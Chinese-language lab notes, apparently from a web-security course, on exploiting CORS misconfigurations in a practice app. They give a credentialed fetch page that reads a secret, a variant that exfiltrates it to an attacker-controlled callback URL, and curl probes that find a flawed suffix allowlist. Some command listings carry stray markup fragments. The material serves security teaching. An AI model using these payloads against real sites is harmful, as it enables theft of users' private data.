起初，这看起来可能有些奇怪，但在实际业务中，开发者确实有正当理由需要允许多个不同的域名以经过身份验证的方式访问其内部资源。正如我们之前所强调的，当 `Access-Control-Allow-Credentials` 设置为 "true" 时，`Access-Control-Allow-Origin` 是绝对不允许使用通配符 (`*`) 的。如果开发者希望他们的应用程序同时支持多个跨域源（比如主站和多个不同的业务子域名），他们就必须自己“造轮子”来绕过这个限制。为了图省事，一种常见的错误做法就是：服务器不再返回通配符，而是直接读取 HTTP 请求里的 `Origin` 值，并将其原封不动地反射回响应头中。

既然确认了目标应用存在这种“无条件反射 Origin”的漏洞配置，我们理论上就能够从任何外部域名（包括黑客控制的域名）调用受保护的 `/code` 端点，并读取其中的敏感数据。

为了实施这个攻击，我们需要在我们的 Kali 攻击机上创建一个恶意的 HTML 页面。我们将新建一个名为 `cors1.html` 的文件，填入相应的攻击代码，并将其部署到 Kali 机器的 Web 服务目录 `/var/www/html/` 下。

```html
<html>
<head>
<script>
var url = "https://cors-sandbox/code";

function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    console.log(data);
  });
}

get_code();
</script>
</head>
<body></body>
</html>

```

该页面中的 JavaScript 函数使用 Fetch API 向 `/code` 端点发送一个 GET 请求，请求启用了 CORS 模式并明确包含了凭证（Cookies）。随后，该函数会将 CORS 请求返回的 JSON 响应体记录（打印）到控制台中。

在确保 Apache 服务正在运行之后，让我们在浏览器中打开一个新标签页，访问这个 CORS 测试页面（即部署在 Kali 上的恶意网页）。同时，我们需要确保在另一个标签页中与练习应用程序保持着有效的登录会话（以保证浏览器里存有合法的 Session Cookie）。

由于我们的 CORS 漏洞利用脚本在后台静默执行，页面上并不会有直接的视觉反馈，因此，我们需要打开浏览器的控制台来检查结果。

![image-20260429011044220](./image/WEB200-2023/image-20260429011044220.png)

这个示例充分证明了：运行在不同域名下的 JavaScript 代码能够成功读取 CORS 请求的响应结果。在真实世界的攻击场景中，我们自然无法亲自盯着受害者的浏览器控制台看。然而，既然恶意 JavaScript 已经在前端内存中拿到了这个响应数据，我们就可以进一步更新页面的代码逻辑，将这个敏感的数据片段（secret code）发送到我们指定的任意域名。

接下来，让我们复制一份之前的 HTML 页面，并将其命名为 `cors2.html`。我们将修改其中的 JavaScript 函数，在获取到数据后，再发起一次网络请求，把窃取到的结果直接“外带 (Exfiltrate)”回我们的 Kali 虚拟机。

```javascript
...
function get_code() {
  fetch(url, {
    method: 'GET',
    mode: 'cors',
    credentials: 'include'
  })
  .then(response => response.json())
  .then(data => {
    fetch('http://your ip address/callback?' +  encodeURIComponent(JSON.stringify(data)), {
      mode: 'no-cors'
    });
  });
}
...

```

我们在请求字符串中包含了带有 JSON 响应体的 Fetch 调用。我们使用了 `JSON.stringify()` 将 JSON 格式的响应数据转换为字符串，然后调用 `encodeURIComponent()` 函数对任何可能导致 URL 无效的特殊字符进行编码。

让我们在浏览器中访问这个页面进行测试。与之前一样，页面上没有任何直观的反馈表明发生了什么。让我们转到 Kali 机器上，检查 Apache 服务器的 `access.log` 日志。

太棒了！我们的恶意 CORS 页面成功代表受害者用户发送了获取验证码的请求，并将该验证码外带发送到了我们的 Kali 机器上。虽然在这个实验中我们同时扮演了攻击者和受害者的角色，但这个例子生动地演示了如何利用宽松的 CORS 设置来窃取用户数据。在真实世界的 Web 应用程序中，攻击者可以利用 CORS 漏洞窃取高度敏感的数据，如私人消息、个人资料或银行账号。他们还可以利用 CORS 冒充用户执行状态变更操作，例如转账或修改密码，从而彻底控制受害者的账户。

> [!NOTE]
>
> **攻击者的最终目的**以及**同源策略（SOP）对它们的限制程度**
> CSRF 只能“写”（执行动作），而 CORS 漏洞让你能“读”（窃取数据）。

`Access-Control-Allow-Origin` 响应头在规范上只能指定一个单一的域名。当一个应用程序需要支持来自多个不同源的 CORS 请求时，后端就必须包含相应的服务器端逻辑，以便用合适的域名值进行响应。通常的做法是：应用程序会检查 HTTP 请求头中的 `Origin` 字段，判断它是否与内部的“允许列表 (Allowlist/Whitelist)”相匹配；如果匹配，就在后续响应的 `Access-Control-Allow-Origin` 头中填入该值。如果应用程序在这个功能模块中存在逻辑缺陷，就会导致 CORS 策略配置错误。

导致这种配置错误的最常见的两种逻辑缺陷是：仅仅检查请求的 `Origin` 头是否“包含 (includes)”**某个预设值，或者是否**“以某个预设值结尾 (ends with)”，一旦满足条件就反射该头部的值。

我们的练习应用程序中包含另一个存在允许列表逻辑缺陷的 API 端点。接下来，让我们使用 `curl` 命令行工具向该端点发送请求进行探测。

我们将使用 `-X "OPTIONS"` 参数来指定发送 OPTIONS 预检请求，使用 `-i` 参数让输出结果包含 HTTP 响应头，使用 `-k` 参数允许在使用 SSL/HTTPS 时连接到不受信任的证书服务器，最后加上目标 URL。

```bash
kali@kali:~$ curl -X "OPTIONS" -i -k https://cors-sandbox/allowlist 
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
access-control-allow-origin: https://offensive-security.com
content-type: text/html; charset=utf-8
date: Thu, 15 Jul 2021 17:51:21 GMT
server: waitress
content-length: 0

```

我们在请求中没有指定 `Origin` 头，但服务器返回了一个 `Access-Control-Allow-Origin` 响应头，其值为 `"https://offensive-security.com"`。这可能意味着该域名是唯一被允许的源。

不过，我们可以尝试发送一个包含该域名“变体”的 `Origin` 头，看看服务器会如何反应。我们将再次使用 `curl` 命令，并通过 `-H "Origin: http://www.offensive-security.com"` 来手动添加一个修改后的 `Origin` 头。

```bash
kali@kali:~$ curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.com" -k https://cors-sandbox/allowlist
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
access-control-allow-origin: http://www.offensive-security.com
content-type: text/html; charset=utf-8
date: Thu, 15 Jul 2021 17:52:38 GMT
server: waitress
content-length: 0

```

服务器返回的 `Access-Control-Allow-Origin` 响应头的值与我们刚刚提交的 Origin 值完全匹配，但到目前为止，我们仅仅测试了修改协议（将 HTTPS 改为 HTTP）和添加子域名（添加了 `www.`）。接下来，让我们尝试修改域名的**末尾部分**（后缀）。

```bash
kali@kali:~$ curl -X "OPTIONS" -i -H "Origin: http://www.offensive-security.net" -k https://cors-sandbox/allowlist</cu>
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
<cr>access-control-allow-origin: https://offensive-security.com
content-type: text/html; charset=utf-8
date: Thu, 15 Jul 2021 17:53:48 GMT
server: waitress
content-length: 0

```

服务器返回了原始的 `Access-Control-Allow-Origin` 值。看来修改**顶级域名 (TLD)**[83] 会导致服务器返回默认值。在代码清单 25 中，我们成功添加了子域名，但请注意默认值本身是不包含子域名的。

如果我们通过在域名前面添加内容来改变域名本身，会发生什么呢？让我们试一试。再次使用 `curl`，并将 `Origin` 头的值修改为 `"http://fakeoffensive-security.com"`。

```bash
kali@kali:~$ curl -X "OPTIONS" -i -H "Origin: http://fakeoffensive-security.com" -k https://cors-sandbox/allowlist</cu>
HTTP/2 200 
access-control-allow-credentials: true
access-control-allow-methods: GET
<cr>access-control-allow-origin: http://fakeoffensive-security.com
content-type: text/html; charset=utf-8
date: Thu, 15 Jul 2021 17:54:33 GMT
server: waitress
content-length: 0

```

服务器接受了我们发送的 Origin 值，并将其设置在了 `Access-Control-Allow-Origin` 响应头中。这说明应用程序允许任何以 `"offensive-security.com"` **结尾**的域名，其初衷可能是为了兼容各种子域名。然而，由于它没有校验域名开头是否带有“点号 (`.`)”，只要我们构造的域名以该字符串结尾，就可以完全改变域名的主体。

这种类型的配置错误利用起来可能稍显困难，因为攻击者需要注册一个特定的域名来实施攻击。不过，一旦拥有了域名，编写 HTML 页面和 JavaScript 来实施 Payload 利用的过程，与我们在上一节中学习的内容基本一致。
